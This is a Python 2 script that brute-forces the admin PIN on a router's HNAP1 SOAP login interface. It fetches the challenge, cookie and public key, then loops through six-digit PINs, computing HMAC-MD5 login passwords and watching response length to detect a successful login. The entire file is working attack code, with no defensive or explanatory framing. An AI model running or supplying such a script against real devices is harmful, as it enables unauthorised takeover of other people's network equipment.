import httplib
import xml.etree.ElementTree
import hmac
import md5

ip = '192.168.0.3'

data = """<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>"""

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'SOAPAction' : '"http://purenetworks.com/HNAP1/Login"',
    'Content-Length' : "%d"%(len(data))
    }

conn = httplib.HTTPConnection(ip, 80)
conn.connect()
request = conn.putrequest('POST', '/HNAP1/')
for i in headers:
    conn.putheader(i, headers[i])
conn.endheaders()
conn.send(data)
response = conn.getresponse()
if response.status != 200:
	print "Error, HTTP Code " + str(response.status) + " " + str(response.reason)
	exit(1)
the_page = response.read()
xmldata = xml.etree.ElementTree.fromstring(the_page)

for a in xmldata.findall('{http://schemas.xmlsoap.org/soap/envelope/}Body'):
     for b in a.findall('{http://purenetworks.com/HNAP1/}LoginResponse'):
	challenge = b.findtext('{http://purenetworks.com/HNAP1/}Challenge')
	cookie = b.findtext('{http://purenetworks.com/HNAP1/}Cookie')
	publickey = b.findtext('{http://purenetworks.com/HNAP1/}PublicKey')

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'SOAPAction' : '"http://purenetworks.com/HNAP1/Login"',
    'Content-Length' : '430',
    'Cookie' : 'uid=' + cookie,
    }

data1 = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>Admin</Username><LoginPassword>'
data2 = '</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

count = 275000
while True:
	pin = str(count).zfill(6)
	privatekey = hmac.new(publickey + pin , challenge, md5).hexdigest().upper()
	loginpassword = hmac.new(privatekey, challenge, md5).hexdigest().upper()
	request = conn.putrequest('POST', '/HNAP1/')
	for i in headers:
	    conn.putheader(i, headers[i])
	conn.endheaders()
	conn.send(data1 + loginpassword + data2)
	response = conn.getresponse()
	the_page = response.read()
	print "PIN: " + pin + " RESPONSE BYTES: " + str(len(the_page)) + " HTTP CODE: " + str(response.status) + " " + str(response.reason) + " KEYS:" + loginpassword + ":" + privatekey
	if response.status != 200:
		print "Error, HTTP Code " + str(response.status) + " " + str(response.reason)
		conn.close()
		break
	if(len(the_page) == 350):
		print "FOUND PIN: " + pin
		conn.close()
		break
	if count == 999999:
		print "NOT FOUND"
		conn.close()
		break
	count = count + 1





